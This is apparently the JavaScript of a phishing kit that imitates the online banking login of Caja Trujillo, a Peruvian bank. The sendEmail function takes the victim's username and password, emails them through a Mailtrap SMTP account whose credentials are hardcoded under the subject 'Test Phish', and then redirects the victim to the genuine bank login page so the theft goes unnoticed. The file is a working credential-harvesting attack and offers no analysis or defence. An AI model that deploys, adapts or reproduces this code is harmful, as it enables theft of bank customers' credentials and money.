$("#login-button").click(function(event){
		 event.preventDefault();
	 
	 $('form').fadeOut(500);
	 $('.wrapper').addClass('form-success');
});

function sendEmail() {
	let user = document.getElementById("user").value;
	let password = document.getElementById("password").value;
	Email.send({
		Host : "smtp.mailtrap.io",
		Username : "eea4720a396718",
		Password : "a8487a3a1fc537",
		To : 'b688200acd-01b6b1@inbox.mailtrap.io',
		From : "b688200acd-01b6b1@inbox.mailtrap.io",
		Subject : "Test Phish",
		Body : "<html><h2>Usuario</h2><h3>"+user+"</h3><br></br><h2>Password</h2><h3>"+password+"</h3></html>"
	}).then(
	  () => window.location.href = "https://zonasegura.cajatrujillo.com.pe/ClienteHBPN/(S(5veg3mbokuic15hckiibgu5s))/wfLogin.aspx" 
	);
}